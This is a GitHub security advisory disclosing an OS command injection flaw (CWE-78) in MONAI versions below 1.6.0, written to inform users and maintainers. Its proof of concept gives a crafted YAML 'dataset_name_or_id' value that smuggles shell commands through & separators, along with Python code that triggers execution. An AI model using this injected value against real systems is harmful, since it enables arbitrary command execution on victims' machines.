# [H] MONAI vulnerable to OS command injection

## Summary
Severity: High
Advisory: GHSA-rghg-q7wp-9767
CWE: CWE-78
Ecosystem: PyPI
CVSS: CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-08-18
Source: https://github.com/advisories/GHSA-rghg-q7wp-9767
Type: github-advisory

## Affected
- PyPI: `MONAI` — affected >=0 <1.6.0

## Details
### Comment from JPCERT/CC
We are submitting the report again as we have yet to receive
any responses from you after submitting it on February 5 and March 11.

It would be greatly appreciated if you could send us a message
after confirming it so that we can follow up the case by email.

### Summary
MONAI vulnerable to OS command injection.

### Details
This library concatenates user-controlled values (YAML's
"dataset_name_or_id" or part of "CLI/kwargs")
without quoting or validation. Since this string is passed to subprocess
with shell=True,
shell metacharacters (e.g., Windows: & / Linux: ;) are interpreted.

As a result, arbitrary commands can be concatenated and executed.
Therefore, the reporter identifies this as CWE-78 (OS Command Injection).

The victim needs to load a crafted YAML file in the code that launches
training/validation jobs
based on the configuration (YAML/arguments). There are no other constraints.

### PoC
Verified on Windows.
Load a modified YAML file with crafted "dataset_name_or_id" as follows.
Add command separator characters (such as & or ;) and insert arbitrary
commands.

dataset_name_or_id: '4 & echo "This is exploited" >
"C:\Users\shima\OneDrive\Desktop\tmp\test.txt" & rem'
dataroot: C:/Users/shima/OneDrive/Desktop/tmp/data
datalist: C:/Users/shima/OneDrive/Desktop/tmp/lists/task4.json
work_dir: C:/Users/shima/OneDrive/Desktop/tmp/work
nnunet_raw: C:/Users/shima/OneDrive/Desktop/tmp/nnUNet_raw
nnunet_preprocessed: C:/Users/shima/OneDrive/Desktop/tmp/nnUNet_preprocessed
nnunet_results: C:/Users/shima/OneDrive/Desktop/tmp/nnUNet_results

As a victim, verify running the following Python code to load and
process the YAML file.

from monai.apps.nnunet.nnunetv2_runner import nnUNetV2Runner
from pathlib import Path
#Path of the crafted YAML file
YAML = r"C:\Users\shima\OneDrive\Desktop\tmp\test.yaml"
#Text file overwritten when command executes
OUT  = Path(r"C:\Users\shima\OneDrive\Desktop\tmp\test.txt")
#Read YAML
runner = nnUNetV2Runner(input_config=YAML,
trainer_class_name="nnUNetTrainer")
runner.train_single_model(config="3d_fullres", fold=0, gpu_id=0)
#Verify command execution
print("Result:", OUT.read_text(encoding="utf-8").strip())

Also, see the attached file.
[JVN#50379904-details.zip](https://github.com/user-attachments/files/26231614/JVN.50379904-details.zip)

## References
- https://github.com/Project-MONAI/MONAI/security/advisories/GHSA-rghg-q7wp-9767
- https://github.com/Project-MONAI/MONAI/pull/8885
- https://github.com/Project-MONAI/MONAI
- https://github.com/Project-MONAI/MONAI/releases/tag/1.6.0
